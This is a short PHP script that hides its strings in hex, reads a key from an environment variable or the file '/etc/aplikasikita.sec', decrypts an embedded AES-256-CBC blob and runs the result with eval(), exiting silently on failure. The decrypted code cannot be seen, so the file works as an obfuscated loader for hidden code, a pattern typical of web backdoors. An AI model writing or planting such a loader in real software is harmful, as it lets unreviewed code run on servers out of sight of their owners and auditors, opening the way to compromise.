<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('8vSOQpsriJQHBQFOvaEUig==');

$c=base64_decode(

'EsjEZ9Wpsx9ez6pODW6cPo7aZvTdj/sQGiq+9Y7HyIJy9RdVVtXdj7LCNBvvjVX3DzLOcg5ZmF2A' .
'JviFgHcLl3lPiHHI5lSlt7ey9oZPvE0Pj9/73t2DEWW2dJmmLePfPY9LZUzBOCHRQjuAvUsNTHq5' .
'nv5Of1sc0UzDgYtV23JZbNGRmikpdV3/tAe3u2kj9/6mCLriz0yCrDGabJE+Y406yjNvoL9FcLVu' .
'BmRsJzzsZZqo3/ZXbTNUEzMniqKExzECAQ4md2qGi2UlMDqwBZJZ1hPplK5RQFB4XyVBRqHgPbVw' .
'YaeErWjygHI/5/YYyIbhffmmt9nT5xW7rf8M21MKdlPzOeYCFoLfau6x3Kn/e4ei1wYF6sPDnexq' .
'sUmcDBKTV6mlVLa32rIVw++AvP2s7fuku9Fg6TnOtdJXSpnC1uhxriCfqSNmM1edY9pMWgvPuTmn' .
'DqNtprOPoaTlWqbbEXSKq0VDRPo9QOftKbE86hbq6IYwiVE2r+n0SDz2XdrbcRWSpTed4THSvLxm' .
'tI3RxI5lfjBukEVCDXzoxtA27hnnfAssgrQtpqWaAYBfnfIy5TlgxI0r20VACDr9AAmy25PdQ9W4' .
'sVLyrxI3Kjyq378jJG7rNeJfsW9sh/W1sVQoV3HT7E6LaxPL02L4LABngi39m1Ae/k42HGhtAKM1' .
'PNOESf73Rizp1uvsSnd5Lxgc2Hd5Ifc0BVVgfhHARQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

